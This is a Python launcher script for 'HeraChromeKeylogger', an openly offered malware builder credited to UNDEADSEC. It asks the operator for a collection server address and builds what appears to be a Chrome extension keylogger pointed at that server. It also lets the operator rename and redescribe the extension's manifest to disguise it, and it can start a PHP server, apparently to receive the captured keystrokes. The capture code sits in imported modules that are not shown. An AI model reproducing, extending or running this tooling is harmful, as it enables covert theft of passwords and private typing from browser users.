#!/usr/bin/env python3

######################################################
#                                                    #
#       HeraChromeKeylogger                          #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/A1S0N_                #
#                                                    #
######################################################

from sys import exit, version_info

if version_info<(3,0,0):
    print('[!] Please use Python 3. $ python3 hera.py')
    exit(0)

from core.view import *
from core.pre import *
from core.builder import *

if checkPHP() == False:
    phpNot()
    exit(0)

def main():
    printQue('Insert your server ip/domain:')
    domain = input(' > ')
    if 'https://' in domain:
        domain = domain.split('https://')[1]
        prefix = 'https://'
    elif 'http://' in domain:
        domain = domain.split('http://')[1]
        prefix = 'http://'
    else:
        prefix = 'http://'
    build(prefix, domain)
    printQue('Edit manifest informations (i.e: name) [y/n] ?') 
    editManifest = input(' > ')
    if editManifest.upper() == 'Y':
        printQue('Insert a new name:')
        newName = input(' > ')        
        printQue('Insert a new description:')
        newDesc = input(' > ')  
        printQue('Insert a new version number:')      
        newVersion = input(' > ')
        editMan(newName, newDesc, newVersion)
    done()
    printQue('Start local php server [y/n] ?')
    server = input(' > ')
    if server.upper() == 'Y':
        runServer()


if __name__ == "__main__":
    try:
        clear()
        checkEd()
        head()
        pre()
        main()                
        
    except KeyboardInterrupt:
        end()
        exit(0)




